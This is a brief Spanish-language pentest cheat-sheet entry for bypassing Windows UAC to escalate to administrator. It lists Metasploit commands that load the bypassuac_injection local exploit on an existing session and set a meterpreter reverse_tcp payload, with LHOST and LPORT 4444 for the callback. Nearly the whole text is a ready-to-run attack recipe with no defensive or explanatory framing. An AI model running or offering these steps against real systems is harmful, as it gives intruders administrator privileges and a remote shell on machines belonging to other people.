Técnica para evadir UAC y ejecutar código con privilegios elevados en Windows.

• Permite escalar a administrador  
• Requiere sesión previa  
• Funciona en sistemas vulnerables

---

## Exploit UAC Bypass

Exploita bypass de UAC para elevar privilegios.

```
use exploit/windows/local/bypassuac_injection
```

	set SESSION ID  
	set TARGET Windows x64  
	set PAYLOAD windows/x64/meterpreter/reverse_tcp  
	set LHOST IP  
	set LPORT 4444